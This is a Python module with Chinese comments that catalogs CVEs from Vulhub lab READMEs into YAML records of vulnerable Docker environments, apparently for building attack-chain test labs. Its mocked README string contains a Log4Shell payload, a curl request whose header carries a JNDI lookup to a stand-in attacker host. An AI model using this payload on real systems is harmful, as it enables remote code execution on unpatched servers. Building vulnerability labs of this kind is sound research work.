"""
CVE处理器 - 负责从各种数据源收集和处理CVE信息

Pipeline: 收集 → 处理 → 验证 → 存储
"""

import os
import requests
import yaml
import json
from typing import Dict, List, Optional
from .catalog import (
    CVECatalog, BasicInfo, EnvironmentInfo, AttackInfo,
    AttackChainFit, TopologyFit, VerificationStatus,
    MITREAttackStage, ExploitComplexity, NetworkLayer
)


class CVEProcessor:
    """CVE信息处理器"""

    def __init__(self, output_dir: str = "data/processing/partial"):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)

    def process_from_vulnhub(self, vulnhub_url: str) -> Optional[Dict]:
        """从VulnHub处理CVE信息"""
        try:
            # 1. 获取VulnHub README
            readme_content = self._fetch_vulnhub_readme(vulnhub_url)

            # 2. 提取基础信息
            cve_id = self._extract_cve_id(readme_content)
            if not cve_id:
                print(f"⚠️  无法从VulnHub URL提取CVE ID: {vulnhub_url}")
                return None

            # 3. 查询NVD数据库
            nvd_info = self._query_nvd_database(cve_id)

            # 4. 构建基础catalog数据
            catalog_data = {
                "basic_info": {
                    "cve_id": cve_id,
                    "name": nvd_info.get("name", "Unknown"),
                    "cvss_score": nvd_info.get("cvss_score", 0.0),
                    "description": nvd_info.get("description", ""),
                    "publish_date": nvd_info.get("published_date", ""),
                    "attack_vector": nvd_info.get("attack_vector", ""),
                    "attack_complexity": nvd_info.get("attack_complexity", "")
                },
                "environment": self._extract_environment_info(readme_content),
                "attack_info": self._extract_attack_info(readme_content),
                "attack_chain": {},  # 稍后由mapper填充
                "topology_fit": {},  # 稍后由分析填充
                "verification": {
                    "tested": False,
                    "success_rate": 0.0,
                    "last_tested": "",
                    "test_count": 0
                },
                "last_updated": self._get_current_timestamp(),
                "source_reliability": "medium"
            }

            # 5. 保存处理结果
            self._save_partial_catalog(cve_id, catalog_data)

            return catalog_data

        except Exception as e:
            print(f"❌ 处理VulnHub CVE时出错: {e}")
            return None

    def _fetch_vulnhub_readme(self, vulnhub_url: str) -> str:
        """获取VulnHub README内容"""
        # 这里应该实现实际的网页抓取逻辑
        # 目前返回模拟数据
        return f"""
# CVE-2021-44228 Apache Log4j RCE

## Description
Apache Log4j2 remote code execution vulnerability.

## Setup
```bash
docker pull vulhub/log4j:latest
docker run -d -p 8080:8080 vulhub/log4j:latest
```

## Exploitation
```bash
curl -X POST http://your-ip:8080/login \\
  -H "User-Agent: ${{jndi:ldap://attacker:1389/Exploit}}"
```
"""

    def _extract_cve_id(self, content: str) -> Optional[str]:
        """从内容中提取CVE ID"""
        import re
        cve_matches = re.findall(r'CVE-\d{4}-\d+', content, re.IGNORECASE)
        if cve_matches:
            return cve_matches[0].upper()
        return None

    def _query_nvd_database(self, cve_id: str) -> Dict:
        """查询NVD数据库"""
        # 这里应该调用NVD API
        # 目前返回模拟数据
        mock_data = {
            "CVE-2021-44228": {
                "name": "Apache Log4j Remote Code Execution",
                "cvss_score": 10.0,
                "description": "Apache Log4j2 JNDI features used in configuration...",
                "published_date": "2021-12-10",
                "attack_vector": "NETWORK",
                "attack_complexity": "LOW"
            }
        }
        return mock_data.get(cve_id, {})

    def _extract_environment_info(self, readme_content: str) -> Dict:
        """提取环境信息"""
        import re

        # 提取Docker镜像
        docker_matches = re.findall(r'vulhub/[\w\-]+(?:\:[\w\.]+)?', readme_content)
        docker_image = docker_matches[0] if docker_matches else "vulhub/unknown:latest"

        # 提取端口 - 只提取明确的端口声明，避免匹配Docker tag中的数字
        # 匹配 "Ports: 8080, 8443" 或 "port 8080" 等格式
        port_patterns = [
            r'(?:ports?|端口)[:\s]*(?:[\d,]+\s*)+',  # "Ports: 8080, 8443"
            r'-p\s*(?:\d+:\d+)',  # Docker -p format
            r'--publish\s+\d+'  # Docker --publish format
        ]

        ports = []
        for pattern in port_patterns:
            match = re.search(pattern, readme_content, re.IGNORECASE)
            if match:
                # 从匹配的文本中提取所有数字
                numbers = re.findall(r'\b(\d{2,5})\b', match.group())
                for num in numbers:
                    port_num = int(num)
                    if 10 < port_num < 65536:  # 有效端口范围
                        ports.append(port_num)

        # 去重并排序
        ports = sorted(list(set(ports)))

        return {
            "docker_image": docker_image,
            "image_source": f"https://hub.docker.com/r/{docker_image}",
            "required_ports": ports,
            "estimated_memory": 1024,  # 默认值，可根据实际情况调整
            "startup_time": 30,
            "os_type": "linux"
        }

    def _extract_attack_info(self, readme_content: str) -> Dict:
        """提取攻击信息"""
        # 简化版本，实际应该更详细的分析
        return {
            "exploit_method": "JNDI Injection",
            "attack_surface": "HTTP",
            "access_required": "network",
            "complexity": "low",
            "popular": True,
            "exploit_available": True
        }

    def _save_partial_catalog(self, cve_id: str, catalog_data: Dict):
        """保存部分处理的catalog"""
        filename = os.path.join(self.output_dir, f"{cve_id}.yaml")
        with open(filename, 'w') as f:
            yaml.dump(catalog_data, f, default_flow_style=False)
        print(f"💾 保存部分处理的catalog: {filename}")

    def _get_current_timestamp(self) -> str:
        """获取当前时间戳"""
        from datetime import datetime
        return datetime.now().isoformat()


class CVEMassProcessor:
    """CVE批量处理器"""

    def __init__(self):
        self.processor = CVEProcessor()

    def process_vulnhub_cves(self, vulnhub_urls: List[str]) -> Dict[str, Dict]:
        """批量处理VulnHub CVEs"""
        results = {}

        for url in vulnhub_urls:
            print(f"🔄 处理: {url}")
            catalog_data = self.processor.process_from_vulnhub(url)
            if catalog_data:
                cve_id = catalog_data["basic_info"]["cve_id"]
                results[cve_id] = catalog_data
                print(f"✅ 成功处理: {cve_id}")
            else:
                print(f"❌ 处理失败: {url}")

        return results

    def get_popular_vulnhub_cves(self, count: int = 15) -> List[str]:
        """获取热门VulnHub CVEs"""
        # 这里应该从VulnHub获取实际的受欢迎CVE列表
        # 目前返回模拟数据
        popular_cves = [
            "https://github.com/vulhub/vulhub/tree/master/log4j",
            "https://github.com/vulhub/vulhub/tree/master/struts2",
            "https://github.com/vulhub/vulhub/tree/master/openssl",
            # ... 更多热门CVE
        ]

        return popular_cves[:count]


# 使用示例
if __name__ == "__main__":
    processor = CVEProcessor()

    # 测试处理单个CVE
    test_url = "https://github.com/vulhub/vulhub/tree/master/log4j"
    result = processor.process_from_vulnhub(test_url)

    if result:
        print("🎯 处理结果:")
        print(f"  CVE ID: {result['basic_info']['cve_id']}")
        print(f"  CVSS: {result['basic_info']['cvss_score']}")
        print(f"  镜像: {result['environment']['docker_image']}")
        print(f"  端口: {result['environment']['required_ports']}")